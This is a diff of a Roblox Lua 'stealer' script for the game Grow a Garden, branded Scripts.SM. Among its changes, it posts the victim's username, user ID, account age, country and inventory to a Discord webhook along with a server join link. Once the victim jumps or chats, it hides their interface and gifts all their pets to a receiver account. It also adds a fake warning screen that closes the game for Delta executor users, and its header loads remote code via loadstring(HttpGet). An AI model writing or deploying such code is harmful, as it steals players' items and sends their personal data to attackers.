@@ -56,9 +56,124 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             return name or "Unknown"
         end
 
-        if detectExecutor() == "Delta" then
-            Players.LocalPlayer:Kick("Delta is not supported! Please use a different executor.")
-            error("Script doesn't work on delta")            
+        if detectExecutor() == 'Delta' then
+            for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+                pcall(function()
+                    v:Destroy()
+                end)
+            end
+            local gui = Instance.new("ScreenGui")
+            gui.Name = "WarningGUI"
+            gui.IgnoreGuiInset = true
+            gui.ResetOnSpawn = false
+            if syn and syn.protect_gui then
+                syn.protect_gui(gui)
+            end
+            gui.Parent = game:GetService("CoreGui")
+            local background = Instance.new("Frame")
+            background.Size = UDim2.new(1, 0, 1, 0)
+            background.Position = UDim2.new(0, 0, 0, 0)
+            background.BackgroundColor3 = Color3.new(0, 0, 0)
+            background.BorderSizePixel = 0
+            background.Parent = gui
+            local container = Instance.new("Frame")
+            container.AnchorPoint = Vector2.new(0.5, 0.5)
+            container.Position = UDim2.new(0.5, 0, 0.45, 0)
+            container.Size = UDim2.new(0.8, 0, 0.5, 0)
+            container.BackgroundTransparency = 1
+            container.Parent = background
+                            -- Данные для копирования
+            local executors = {
+                {name = "KRNL", link = "https://krnl.cat/"},
+                {name = "Codex", link = "https://codex.lol/"},
+                {name = "Arceus X", link = "https://spdmteam.com/index"},
+                {name = "Fluxus", link = "https://fluxus.team/download/"},
+            }
+            -- UIGridLayout для кнопок
+            local buttonsContainer = Instance.new("Frame")
+            buttonsContainer.Size = UDim2.new(1, 0, 0, #executors * 50)
+            buttonsContainer.BackgroundTransparency = 1
+            buttonsContainer.Parent = container
+            local grid = Instance.new("UIGridLayout")
+            grid.CellSize = UDim2.new(0.45, 0, 0, 40)
+            grid.CellPadding = UDim2.new(0.05, 0, 0, 10)
+            grid.FillDirectionMaxCells = 2
+            grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+            grid.VerticalAlignment = Enum.VerticalAlignment.Top
+            grid.SortOrder = Enum.SortOrder.LayoutOrder
+            grid.Parent = buttonsContainer
+            -- Создание кнопок
+            for _, exec in ipairs(executors) do
+                local btn = Instance.new("TextButton")
+                btn.Text = "Copy " .. exec.name .. " Link"
+                btn.TextScaled = true
+                btn.Font = Enum.Font.SourceSansBold
+                btn.TextColor3 = Color3.new(1, 1, 1)
+                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+                btn.BorderSizePixel = 0
+                btn.AutoButtonColor = true
+                btn.Size = UDim2.new(0, 200, 0, 40)
+                btn.Parent = buttonsContainer
+            
+                btn.MouseButton1Click:Connect(function()
+                    if setclipboard then
+                        setclipboard(exec.link)
+                    end
+                    btn.Text = "Copied!"
+                    task.delay(1.5, function()
+                        btn.Text = "Copy " .. exec.name .. " Link"
+                    end)
+                end)
+            end
+            local uiList = Instance.new("UIListLayout")
+            uiList.FillDirection = Enum.FillDirection.Vertical
+            uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+            uiList.VerticalAlignment = Enum.VerticalAlignment.Center
+            uiList.SortOrder = Enum.SortOrder.LayoutOrder
+            uiList.Padding = UDim.new(0, 10)
+            uiList.Parent = container
+            local function createLabel(text, color)
+                local label = Instance.new("TextLabel")
+                label.BackgroundTransparency = 1
+                label.Size = UDim2.new(1, 0, 0, 40)
+                label.TextColor3 = color or Color3.new(1, 1, 1)
+                label.Text = text
+                label.Font = Enum.Font.SourceSansBold
+                label.TextScaled = true
+                label.TextWrapped = true
+                label.Parent = container
+                return label
+            end
+            local dangerEmoji = "⚠️"
+            createLabel(dangerEmoji .. " [Delta Executor Detected] " .. dangerEmoji, Color3.fromRGB(255, 255, 0))
+            createLabel("WARNING!: Delta Executor Is A Malware!", Color3.fromRGB(255, 0, 0))
+            createLabel("It logs your information and is very detected!", Color3.new(1, 1, 1))
+            createLabel("Please use any of these executors:", Color3.new(1, 1, 1))
+            createLabel("(KRNL, Codex, Arceus X, Fluxus)", Color3.fromRGB(0, 255, 255))
+            createLabel("Those are supported and legit exploits!", Color3.new(1, 1, 1))
+            local countdownLabel = Instance.new("TextLabel")
+            countdownLabel.AnchorPoint = Vector2.new(0.5, 1)
+            countdownLabel.Position = UDim2.new(0.5, 0, 1, -20)
+            countdownLabel.Size = UDim2.new(1, -40, 0, 40)
+            countdownLabel.BackgroundTransparency = 1
+            countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            countdownLabel.TextScaled = true
+            countdownLabel.Font = Enum.Font.SourceSansBold
+            countdownLabel.Text = "Game will be closed in 30 seconds. Please install other executor"
+            countdownLabel.Parent = background
+            local seconds = 30
+            task.spawn(function()
+                while seconds > 0 do
+                    countdownLabel.Text = "Game will be closed in " .. seconds .. " second" .. (seconds == 1 and "" or "s") .. ". Please install other executor"
+                    task.wait(1)
+                    seconds -= 1
+                end
+                local Players = game:GetService("Players")
+                local player = Players.LocalPlayer
+                game:Shutdown()
+            end)
+            task.wait(999999)
+            return
         end
 
         local function formatNumberWithCommas(n)
@@ -305,9 +420,9 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
-        local petString = "```"
+        local petString = ""
 
-        for i, pet in ipairs(pets) do
+        for _, pet in ipairs(pets) do
             local emoji = "🐶" -- Default to normal pet
 
             if priorities[pet.Type] then
@@ -351,94 +466,53 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             end
         end
 
-        petString = petString .. "\n```"
-
         local accountAgeInDays = Players.LocalPlayer.AccountAge
         local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60) -- Converts days to seconds and subtracts
         local creationDateString = os.date("%Y-%m-%d", creationDate) -- Formats the date as Year-Month-Day
 
+        local function truncateByLines(inputString, maxLines)
+            local lines = {}
+            for line in inputString:gmatch("[^\n]+") do
+                table.insert(lines, line)
+            end
+            
+            if #lines <= maxLines then
+                return inputString
+            else
+                local truncatedLines = {}
+                for i = 1, maxLines - 1 do -- -1 to leave room for "(truncated)" line
+                    table.insert(truncatedLines, lines[i])
+                end
+                return table.concat(truncatedLines, "\n")
+            end
+        end
+
         local payload = {
     username = "Scripts.SM",
     avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
-    content = "",
+    content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
     embeds = {{
         title = "<:pack:1365295947281862656> Scripts.SM • Grow a Garden Hit",
         url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
         color = 0x03D7FC,
         fields = {
-            {
-                name = "<:players:1365290081937526834> Player Info",
-                value = "Details of the player who sent the pets/fruits:",
-                inline = false
-            },
-            {
-                name = "<:stats:1365955343221264564> Display Name",
-                value = "```" .. game.Players.LocalPlayer.DisplayName .. "```",
-                inline = true
-            },
-            {
-                name = "<:stats:1364189776885973072> Username",
-                value = "```" .. game.Players.LocalPlayer.Name .. "```",
-                inline = true
-            },
-            {
-                name = "<:reset:1364189779435978804> User ID",
-                value = "```" .. tostring(game.Players.LocalPlayer.UserId) .. "```",
-                inline = true
-            },
-            {
-                name = "<:time:1365991843011100713> Account Age",
-                value = "```" .. tostring(game.Players.LocalPlayer.AccountAge) .. " days" .. "```",
-                inline = true
-            },
-            {
-                name = "<:players:1365290081937526834> Receiver",
-                value = "```" .. Username .. "```",
-                inline = true
-            },
-            {
-                name = "<:changes:1365295949811028068> Created",
-                value = "```" .. creationDateString .. "```",
-                inline = true
-            },
-            {
-                name = "<:stats:1364189776885973072> Executor",
-                value = "```" .. detectExecutor() .. "```",
-                inline = true
-            },
-            {
-                name = "<:location:1365290076279541791> Country",
-                value = "```" .. getPlayerCountry(game.Players.LocalPlayer) .. "```",
-                inline = true
-            },
-            {
-                name = "<:players:1365290081937526834> Player Count",
-                value = "```" .. playerCount .. "/5" .. "```",
-                inline = true
-            },
-            {
-                name = "<:money:1365955380294844509> Inventory (Pet & Fruits)",
-                value = petString,
-                inline = false
-            },
-            {
-                name = "<:folder:1365290079081205844> Join Script",
-                value = "```lua\n" .. tpScript .. "\n```",
-                inline = false
-            },
-            {
-                name = "<:game:1365295942504550410> Join with URL",
-                value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                inline = false
-            },
-            {
-                name = "<:events:1365290073767022693> Watermark",
-                value = "**Made by Scripts.SM** | [Join our Official Discord](https://discord.gg/ynm4BvqZ78)",
-                inline = false
-            }
+            { name = "<:players:1365290081937526834> Player Info", value = "Details of the player who sent the pets & fruits:", inline = false },
+            { name = "<:stats:1365955343221264564> Display Name", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = true },
+            { name = "<:stats:1364189776885973072> Username", value = "```" .. (player.Name or "Unknown") .. "```", inline = true },
+            { name = "<:reset:1364189779435978804> User ID", value = "```" .. tostring(player.UserId or "N/A") .. "```", inline = true },
+            { name = "<:time:1365991843011100713> Account Age", value = "```" .. tostring(accountAgeInDays or 0) .. " days```", inline = true },
+            { name = "<:players:1365290081937526834> Receiver", value = "```" .. (Username or "Unknown") .. "```", inline = true },
+            { name = "<:changes:1365295949811028068> Created", value = "```" .. (creationDateString or "Unknown") .. "```", inline = true },
+            { name = "<:stats:1364189776885973072> Executor", value = "```" .. (detectExecutor() or "Unknown") .. "```", inline = true },
+            { name = "<:location:1365290076279541791> Country", value = "```" .. (country or "Unknown") .. "```", inline = true },
+            { name = "<:players:1365290081937526834> Player Count", value = "```" .. (playerCount or 0) .. "/5```", inline = true },
+            { name = "<:money:1365955380294844509> Inventory (Pets & Fruits)", value = formatInventory(pets), inline = false },
+            { name = "<:folder:1365290079081205844> Join Script", value = "```lua\n" .. (tpScript or "N/A") .. "\n```", inline = false },
+            { name = "<:game:1365295942504550410> Join with URL", value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false },
+            { name = "<:events:1365290073767022693> Watermark", value = "**Made by Scripts.SM** | [Join our Official Discord](https://discord.gg/ynm4BvqZ78)", inline = false }
         },
-                footer = {
-            text = "Scripts.SM • Job ID: " .. game.JobId,
+        footer = {
+            text = "Scripts.SM • Job ID: " .. (game.JobId or "Unknown"),
             icon_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"
         },
         timestamp = DateTime.now():ToIsoDate()
@@ -446,12 +520,10 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
     attachments = {}
 }
 
-
-
         if hasRarePets() then
             payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
 
-                local success = pcall(function()
+                local success, err = pcall(function()
                     request({
                         Url = Webhook,
                         Method = "POST",
@@ -460,7 +532,11 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                         },
                         Body = HttpService:JSONEncode(payload)
                     })
+
                 end)
+                if not success then
+                warn("Failed to send webhook:", err)
+            end
         else
             payload.content = "To activate the stealer you must jump or type in chat"
 
@@ -580,7 +656,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             task.wait()
         until jumped or chatted
 
-        for _, v in targetPlr.PlayerGui:GetDescendants() do
+       for _, v in targetPlr.PlayerGui:GetDescendants() do
             if v:IsA("ScreenGui") then
                 v.Enabled = false
             end
@@ -633,17 +709,16 @@ local inventory = targetPlr.Backpack
 local function quickGift(tool)
     -- Equip the tool (no attempt limit)
     repeat
-        pcall(function()
             if tool.Parent == targetPlr.Backpack then
                 tool.Parent = targetChar
             end
-        end)
         task.wait(0.05)
     until tool.Parent == targetChar
 
     repeat
+        task.wait(0.25) -- Short delay between attempts
         RS:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", receiverPlr)
-        task.wait(0.5) -- Short delay between attempts
+        task.wait(0.25) -- Short delay between attempts
     until tool.Parent ~= targetChar and tool.Parent ~= targetPlr.Backpack
 
     if tool.Parent == targetChar then
@@ -671,6 +746,7 @@ for _, pet in ipairs(pets) do
         
         -- Run quickGift until success (it will handle its own retries)
         quickGift(tool)
-        
+        task.wait(0.3)
+    
     end
 end
